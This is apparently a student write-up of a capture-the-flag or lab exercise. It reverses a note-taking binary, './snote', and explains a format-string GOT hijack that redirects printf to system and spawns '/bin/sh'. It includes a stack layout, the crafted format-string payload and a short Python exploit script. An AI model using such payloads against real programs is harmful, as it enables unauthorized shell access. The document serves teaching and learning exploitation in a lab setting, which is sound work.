# Christa Write Up
### by Tilden Jackson (thjackso)
## Content
* [Binary Reversing](#reversing)
* [Vulnerability Details](#exploit-details)
* [Working Exploit](#working-exploit)

## Reversing
This code `./snote` has 2 main functions to consider: `main, note`. We start by running the code to take a look at what it does:
\
![This function takes two arguments in the command line: subject and note.](https://i.postimg.cc/9fMFjzcn/normal.png)
Note that opposed to in Alice's and Christa's versions of `./snote` we can put in more than 2 command line arguments and execution will continue. (This will be important later.)

Looking deeper at the binary we can get a deeper look at how it works:
![Main function disassembled](https://i.postimg.cc/MptK41JB/main.png)
The main function stores `argc` in `-0x4(rbp)` and `argv[]` in `-0x10(rbp)` and then sets up a call to `<note>` by printing out the number of command line arguments and calling `system("/bin/date")`. This system call is something that we will definitely try to take advantage of when crafting an exploit.

Looking at `<note>` we see:
![Disassembled Note](https://i.postimg.cc/Lsb44RX6/note.png)
The function `<note>` takes 2 arguments as shown in the pseudocode bellow. It uses `memcpy` to store `subject@argv[1]` into the buffer but will continue to write 0x72 bytes into it no matter the length of subject. It then moves a string constant into the buffer after the first string that it has stored in the buffer (after subject) and then proceeds to print out the information using a series of `puts` and `printf` calls.

---
A pseudocode of this binary would look like: 
```
int main(int argc, const char* argv[]){
	if (argc <= 2){
		puts(...);
		return -1;
	}

	printf("Hacking Diary: Day %d\n", argc-1);

	system("/bin/date");

	note(argv[1],argv[2]);

	return 0;
}

int note(const char* subject, const char* note){
	char* subject = subject; //@-0x88(rbp)
	char* note = note; //@-0x90(rbp)

	char* buf[0x82]; //@-0x80(rbp)
	memcpy(buf, subject, 0x72);

	int len = strlen(buf);

	//essentially: strcpy(buf+len, " by Chairman\n");
	buf+len += " by Chairman\n";
	
	puts("[-] Subject: ");
	printf(buf); //Here we can overwrite linker addr of printf to system
	puts("[-] Note: ");
	printf(note); //Now call /bin/bash
	puts("");
	return "";
}
```
\
**Vulnerabilities**
Our `memcpy` will only copy `0x72 bytes` and our buffer is `0x80 bytes` on the stack so we cannot overwrite the return address to execute shellcode or any ret2pop exploits.

However, we are given full control of the `printf()` statements in the `<note>` function so we can easily use a format string exploit to leak information or take control of the machine. Additionally, we are told that GOT is not randomized (as it is difficult to do dynamic-linking while GOT is randomized). Since we have a call to `system()` in the main function, we can execute a GOT hijack attack with the first `printf` call to change `printf() -> system()` in the GOT table and thus we can call system on anything we want in the second `"printf"` call. 

There are no defenses to this that have been implemented other than ASLR which will not affect out GOT hijack attack.

## Exploit Details
In order to implement our GOT hijack attack, we need to know some important pieces of information so that we can string our attack together. For our attack, we will change the value stored in the GOT table of `printf` to be the value of `system`. To do this, we need to know the address of the GOT table for `printf` and the value that `system` stores in GOT table.

The GOT table addresses are easily obtainable from the the assembly as we can see with the constant jmp values:
![GOT table location values](https://i.postimg.cc/Kz0P81T3/assembly-got.png)

The address of the GOT table for `printf` is `0x404030` and for `system` is `0x404028`.
Now we can use gdb to look at the values that are normally stored in there:
![GOT table addresses](https://i.postimg.cc/QtzFz15m/values-got.png)

We need to change the value in the GOT table for `printf` to `0x401050` because that is the value for `system` in the GOT table. In order to do this we will leverage the `%n` format qualifier to store a certain value. More specifically, we will need to use `%n and %hhn` to overwrite the value at `0x404030` to `0x401050`. Since the `%n` format qualifier puts the number of bytes printed into the location specified with the qualifier, we will first need to but the `0x10` and then the `0x40` and then the `0x50`. However, these will overwrite with zeros everytime if we just use `%n` so instead we will use `%hhn` to only write to the lowest byte at that address and thus not overwrite any other value.

Our formatted string will look something like this:
`"%16u%xx$hhn%48u%yy$n%16u%zz$hhn"` The `%_u` qualifier will print out spaces in the number specified to it. Thus in our format string, we print `0x10 bytes` with the `%16u` and then store `0x10` with the `%hhn` qualifier at the value pointed at to by x. We print `0x30 bytes`  more with `%48u` which brings us up to `0x40` which we then store into the location pointed at by y using `%n` which will overwrite other values in the word after that with zeros. Then we print out `0x10 bytes` more bringing us up to `0x50` which we then store into the location pointed at by z. Thus, if we have x, y, and z correct, we will overwrite the value stored in the GOT table for `printf` to `0x401050` which will change our next call to a system call where we can leverage the value of note as `/bin/sh` to spawn a shell.

The values for the format strings will be as follows:
x must point to `0x404031` since we want to write the middle byte as `0x10`
y must point to `0x404032` since we want to write the farther byte as `0x40` and 
z must point to `0x404030` since the lowest byte we want as `0x50`

We can actually store these values onto our stack in the buffer since `memcpy` does not stop when we give it null bytes and then reference x, y, and z properly to refer to those strings with those locations.

To do this, we must look at our stack and how we will set it up.
 
Normally our stack looks like this:
```
| addr rel. rbp in func | val|
------------------------------
| +0x08 | return address     | 
------------------------------
| +0x00 | old(rbp)           |
------------------------------ (start <note> stack)
|       |                    |
| -0x80 | buf[0x80]          |
|       |                    |
------------------------------
| -0x88 | const char* subject| //argv[1]
------------------------------
| -0x90 | const char* note   | //argv[2]
------------------------------ (end <note> stack)
```

While the stack does not change much in shape or function, it is still quite important for our exploit to know where things are on the stack so that we can reference them with our printf attack.

Here is what our stack looks like with the exploit:
```
| addr rel. rbp in func | val      |
------------------------------------
| +0x08 | return address           | 
------------------------------------
| +0x00 | old(rbp)                 |
------------------------------------ (start <note> stack)
|     |       |  ....              | 
| s11 | -0x40 | 0x404032           |
| s10 | -0x48 | 0x404031           |
| s9  | -0x50 | 0x404030           |
| s8  | -0x58 | "sh\0aaaa\0"       |
| s7  | -0x60 | "n\n\0/bin/"       | start argv[2]
| s6  | -0x68 | " Chairma"         | 
| s5  | -0x70 | "6u%zz by"         |
| s4  | -0x78 | "48u%yy%1"         |
| s3  | -0x80 | "%16u%xx%"         | argv[1] + addon
------------------------------------ (start buf[0x80] @ -0x80(rbp) )
| s2  | -0x88 | const char* subject| //argv[1]
------------------------------------
| s1  | -0x90 | const char* note   | //argv[2]
------------------------------------ (end <note> stack)
```
The values we want are in s9 - s11 which are the 8byte increments of the stack. Since we take 5 arguments in registers in printf, we have out values of x, y, and z:
xx - 15
yy - 16
zz - 14
## Working Exploit
Our final string is as follows where we use `b''` to put only null bytes in the buffer to properly write our reference addresses:

```
[b"%16u%15$hhn%48u%16$n%16u%14$hhn", b"/bin/sh", b"aaaaaaa",
b"\x30\x40\x40", b'', b'', b'', b'',
b"\x31\x40\x40", b'', b'', b'', b'',
b'\x32\x40\x40', b'', b'', b'', b'']
```

In a python script we have:
```
#!/usr/bin/env python3
# file: exploit.py

import subprocess

filename = b"./snote"

exploit = [b"%16u%15$hhn%48u%16$n%16u%14$hhn", b"/bin/sh", b"t1ld3n!", 
b"\x30\x40\x40", b'', b'', b'', b'',
b"\x31\x40\x40", b'', b'', b'', b'',
b'\x32\x40\x40', b'', b'', b'', b'']

subprocess.run([filename] + exploit)
```
>I replaced the paddding (b"a"*7 to b"t1ld3n!" because its the same and has my name)

We run these as our command line arguments to `./snote` to verify and we get:
![The exploit succeeds!](https://i.postimg.cc/Pq9gCqkJ/exploit.png)
